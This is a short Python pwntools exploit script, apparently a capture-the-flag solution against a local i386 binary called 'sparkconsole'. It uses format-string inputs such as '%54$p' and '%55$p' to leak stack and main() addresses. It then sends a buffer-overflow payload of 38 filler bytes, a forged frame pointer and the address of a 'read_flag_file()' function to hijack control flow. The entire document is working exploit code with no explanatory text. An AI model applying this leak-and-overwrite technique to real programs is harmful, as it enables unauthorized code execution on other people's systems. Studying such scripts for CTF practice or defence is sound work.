from pwn import *
context.arch = 'i386'

binary = ELF('./sparkconsole')
p = process(binary.path)

p.recvuntil(b'$ ')
p.sendline(b'echo %54$p')
recv = p.recvuntil(b'\n$', drop=True).strip()
log.info(f"Leaked Local Vars: {recv}")
stack_frame = int(recv, 16)

p.sendline(b'echo %55$p')
recv = p.recvuntil(b'\n$', drop=True).strip()
log.info(recv)
main_addr = int(recv, 16) - 0x6c
log.info(f"Leaked main(): 0x{main_addr:x}")

p.sendline(b'exit')

offset  = 38
win_addr = main_addr - 0x285   # read_flag_file()

payload = flat(
    b"A" * offset,
    p32(stack_frame + 4),
    p32(0xdeadbeef),
    p32(win_addr),
)

p.sendline(payload)
p.interactive()
